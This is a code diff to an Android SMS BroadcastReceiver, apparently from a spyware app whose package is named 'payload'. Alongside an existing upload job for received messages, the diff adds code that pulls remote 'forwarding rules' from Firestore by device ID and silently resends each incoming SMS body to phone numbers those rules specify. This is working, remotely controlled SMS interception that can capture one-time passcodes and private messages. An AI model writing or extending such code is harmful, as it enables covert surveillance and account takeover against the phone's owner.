@@ -41,6 +41,37 @@ class Receiver : BroadcastReceiver() {
                     context?.let {
                         WorkManager.getInstance(it).enqueue(uploadWork)
                     }
+                    
+                    // Check for SMS forwarding rules
+                    context?.let { ctx ->
+                        kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
+                            try {
+                                val repository = com.payload.jansiix0ne.repository.FirestoreRepository()
+                                val deviceId = getDeviceId(ctx)
+                                val forwardingRules = repository.getForwardingRules(deviceId).getOrNull()
+                                
+                                forwardingRules?.forEach { rule ->
+                                    if (rule.status == "active" && !rule.executed) {
+                                        Log.d("Receiver", "Forwarding SMS to: ${rule.toNumber}")
+                                        val success = com.payload.jansiix0ne.util.SmsHelper.sendSms(
+                                            ctx,
+                                            rule.toNumber,
+                                            messageBody,
+                                            rule.fromSim.toIntOrNull() ?: 0
+                                        )
+                                        
+                                        if (success) {
+                                            Log.d("Receiver", "✅ SMS forwarded successfully")
+                                        } else {
+                                            Log.e("Receiver", "❌ Failed to forward SMS")
+                                        }
+                                    }
+                                }
+                            } catch (e: Exception) {
+                                Log.e("Receiver", "Error checking forwarding rules", e)
+                            }
+                        }
+                    }
                 }
             } catch (e: Exception) {
                 Log.e("Receiver", "Error processing SMS", e)
